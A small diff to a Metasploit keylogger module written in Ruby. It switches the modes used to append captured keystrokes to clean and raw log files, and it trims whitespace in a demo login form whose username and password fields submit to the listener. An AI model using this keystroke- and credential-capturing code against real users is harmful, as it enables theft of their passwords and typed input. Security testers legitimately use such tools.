@@ -182,8 +182,8 @@ class Metasploit3 < Msf::Auxiliary
 			print_good("[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
 		end
 
-		::File.open( @client_cache[cid][:path_clean], "a") { |fd| fd.puts nice }
-		::File.open( @client_cache[cid][:path_raw], "a")   { |fd| fd.write(real) }
+		::File.open( @client_cache[cid][:path_clean], "ab") { |fd| fd.puts nice }
+		::File.open( @client_cache[cid][:path_raw], "ab")   { |fd| fd.write(real) }
 
 		if nice.length > 0
 			print_good("[#{cid}] Keys: #{nice}")
@@ -207,12 +207,12 @@ class Metasploit3 < Msf::Auxiliary
 </head>
 <body bgcolor="white">
 <br><br>
-<div align="center"> 
+<div align="center">
 <h1>Keylogger Demo Form</h1>
 <form method=\"POST\" name=\"logonf\" action=\"#{base_url}/demo/?id=#{cid}\">
 <p><font color="red"><i>This form submits data to the Metasploit listener for demonstration purposes.</i></font>
 <br><br>
-<table border="0" cellspacing="0" cellpadding="0"> 
+<table border="0" cellspacing="0" cellpadding="0">
 <tr><td>Username:</td> <td><input name="username" size="20"></td> </tr>
 <tr><td>Password:</td> <td><input type="password" name="password" size="20"></td> </tr>
 </table>
